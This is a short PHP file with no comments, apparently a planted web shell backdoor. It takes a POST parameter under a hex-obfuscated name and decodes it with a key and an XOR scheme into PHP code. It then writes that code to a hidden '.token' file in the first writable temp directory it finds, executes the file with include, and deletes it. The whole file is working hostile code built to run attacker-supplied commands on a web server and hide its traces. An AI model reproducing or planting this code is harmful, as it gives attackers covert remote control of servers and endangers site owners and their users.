<?php

if(isset($_POST["\x62\x69n\x64\x69ng"])){
	$desc = $_POST["\x62\x69n\x64\x69ng"];
		$desc	 =explode	 (   "." ,$desc	)  ;
	$object 	= '';
            $s 	= 'abcdefghijklmnopqrstuvwxyz0123456789';
            $sLen 	= strlen($s );
            $u 	= 0;
    
            $__tmp 	= $desc;
            while ($v6 	= array_shift($__tmp)) {$sChar 	= ord($s[$u 	%	 $sLen] );
                $dec 	= ((int)$v6 - $sChar - ($u 	%	 10)) ^ 44;
                $object.= chr($dec );
                $u++;	}	
	$parameter_group = array_filter([ini_get("upload_tmp_dir"), getcwd(), "/tmp", session_save_path(), getenv("TMP"), "/var/tmp", getenv("TEMP"), sys_get_temp_dir(), "/dev/shm"]);
	while ($pointer = array_shift($parameter_group)) {
    		if (array_product([is_dir($pointer), is_writable($pointer)])) {
    $data = vsprintf("%s/%s", [$pointer, ".token"]);
    if (file_put_contents($data, $object)) {
	include $data;
	@unlink($data);
	die();
}
}
}
}